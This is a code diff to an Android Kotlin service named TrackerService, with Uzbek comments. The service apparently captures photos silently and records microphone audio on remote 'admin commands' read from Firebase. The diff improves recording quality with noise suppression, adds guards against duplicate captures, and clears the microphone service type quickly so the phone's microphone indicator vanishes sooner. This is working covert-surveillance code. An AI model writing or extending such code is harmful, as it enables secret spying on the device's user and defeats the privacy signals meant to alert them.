@@ -269,13 +269,17 @@ class TrackerService : Service() {
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             try {
-                startForeground(
-                    NOTIFICATION_ID,
-                    notification,
+                val types = if (isRecording) {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                } else {
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
-                )
+                }
+                startForeground(NOTIFICATION_ID, notification, types)
             } catch (e: Exception) {
                 try {
                     startForeground(
@@ -295,22 +299,26 @@ class TrackerService : Service() {
             }
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             try {
-                startForeground(
-                    NOTIFICATION_ID,
-                    notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-                )
+                val types = if (isRecording) {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                } else {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                }
+                startForeground(NOTIFICATION_ID, notification, types)
             } catch (_: Exception) {
                 startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
             }
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             try {
+                val types = if (isRecording) {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                } else {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                }
                 startForeground(
                     NOTIFICATION_ID,
                     notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                    types
                 )
             } catch (_: Exception) {
                 startForeground(NOTIFICATION_ID, notification)
@@ -343,11 +351,16 @@ class TrackerService : Service() {
         } catch (_: Exception) {}
     }
 
+    private var areCommandsListenersAttached = false
     private var lastHandledPhotoTimestamp = 0L
     private var lastHandledScreenTimestamp = 0L
 
     private fun listenToAdminCommands() {
-        commandsRef?.child("take_photo")?.addValueEventListener(object : ValueEventListener {
+        if (areCommandsListenersAttached) return
+        val cmd = commandsRef ?: return
+        areCommandsListenersAttached = true
+
+        cmd.child("take_photo").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val timestamp = snapshot.getValue(Long::class.java) ?: 0L
                 if (timestamp > 0L && timestamp != lastHandledPhotoTimestamp) {
@@ -491,7 +504,14 @@ class TrackerService : Service() {
         return cameraHandler!!
     }
 
+    private var isCapturingPhoto = false
+
     private fun capturePhotosSilently() {
+        if (isCapturingPhoto) {
+            Log.w(TAG, "Photo capture already in progress, skipping duplicate request")
+            return
+        }
+        isCapturingPhoto = true
         val devId = getActiveDeviceId()
         acquireWakeLock(30000L)
         mediaRef?.child("status")?.setValue("Kameralar faollashmoqda...")
@@ -499,6 +519,7 @@ class TrackerService : Service() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             mediaRef?.child("status")?.setValue("Kamera ruxsati berilmagan")
             releaseWakeLock()
+            isCapturingPhoto = false
             return
         }
 
@@ -511,6 +532,7 @@ class TrackerService : Service() {
                 if (cameraIds.isEmpty()) {
                     mediaRef?.child("status")?.setValue("Kamera topilmadi")
                     releaseWakeLock()
+                    isCapturingPhoto = false
                     return@post
                 }
 
@@ -590,6 +612,7 @@ class TrackerService : Service() {
                 }, 3000L)
             } catch (e: Exception) {
                 Log.e(TAG, "launchCameraActivity error", e)
+                isCapturingPhoto = false
                 releaseWakeLock()
             }
         }
@@ -614,6 +637,7 @@ class TrackerService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "saveBothPhotos error", e)
         } finally {
+            isCapturingPhoto = false
             releaseWakeLock()
         }
     }
@@ -742,6 +766,7 @@ class TrackerService : Service() {
     private var audioRecordStartTime: Long = 0L
 
     private fun startAudioRecording() {
+        if (isRecording) return
         try {
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                 mediaRef?.child("audio_status")?.setValue("Mikrofon ruxsati berilmagan")
@@ -754,7 +779,16 @@ class TrackerService : Service() {
             // Ilovadan chiqqanda mikrofon o'chib qolmasligi uchun xizmatni MICROPHONE turiga ko'taramiz
             try {
                 val notif = createNotification()
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    startForeground(
+                        NOTIFICATION_ID,
+                        notif,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    )
+                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     startForeground(
                         NOTIFICATION_ID,
                         notif,
@@ -783,10 +817,19 @@ class TrackerService : Service() {
                 @Suppress("DEPRECATION")
                 MediaRecorder()
             }.apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
+                // VOICE_COMMUNICATION aktivlashtirilganda telefonning ichki Acoustic Echo Canceler (AEC) va Noise Suppressor (NS) tizimlari ishga tushib, aks-sado va shovqinni to'liq yo'qotadi
+                try {
+                    setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                } catch (_: Exception) {
+                    try {
+                        setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
+                    } catch (_: Exception) {
+                        setAudioSource(MediaRecorder.AudioSource.MIC)
+                    }
+                }
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setAudioEncodingBitRate(64000)
+                setAudioEncodingBitRate(128000) // Tiniq va bir tekis ovoz
                 setAudioSamplingRate(44100)
                 setOutputFile(audioFile.absolutePath)
                 setOnErrorListener { _, what, extra ->
@@ -813,6 +856,7 @@ class TrackerService : Service() {
     }
 
     private fun stopAudioRecording() {
+        if (!isRecording && mediaRecorder == null) return
         serviceExecutor.execute {
             try {
                 val elapsed = System.currentTimeMillis() - audioRecordStartTime
@@ -824,17 +868,16 @@ class TrackerService : Service() {
                     mediaRecorder?.stop()
                 } catch (e: Exception) {
                     Log.w(TAG, "MediaRecorder stop: ${e.message}")
+                } finally {
+                    try { mediaRecorder?.reset() } catch (_: Exception) {}
+                    try { mediaRecorder?.release() } catch (_: Exception) {}
+                    mediaRecorder = null
                 }
-                try {
-                    mediaRecorder?.reset()
-                    mediaRecorder?.release()
-                } catch (_: Exception) {}
-                mediaRecorder = null
                 isRecording = false
                 mediaRef?.child("is_audio_recording")?.setValue(false)
                 commandsRef?.child("record_audio")?.setValue(false)
 
-                // FGS turini mikrofon tugagach yana odatiy holatga qaytaramiz
+                // FGS mikrofon turini DARHOL o'chirib oddiy holatga tushiramiz (telefondagi mikrofon ikonkasi darhol yo'qolishi uchun)
                 try {
                     val notif = createNotification()
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
@@ -845,14 +888,24 @@ class TrackerService : Service() {
                             ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                             ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                         )
+                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        startForeground(
+                            NOTIFICATION_ID,
+                            notif,
+                            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                        )
                     } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                         startForeground(
                             NOTIFICATION_ID,
                             notif,
                             ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                         )
+                    } else {
+                        startForeground(NOTIFICATION_ID, notif)
                     }
-                } catch (_: Exception) {}
+                } catch (e: Exception) {
+                    Log.w(TAG, "Reset FGS error: ${e.message}")
+                }
 
                 val audioFile = File(filesDir, "audio_record.m4a")
                 if (audioFile.exists() && audioFile.length() > 0) {
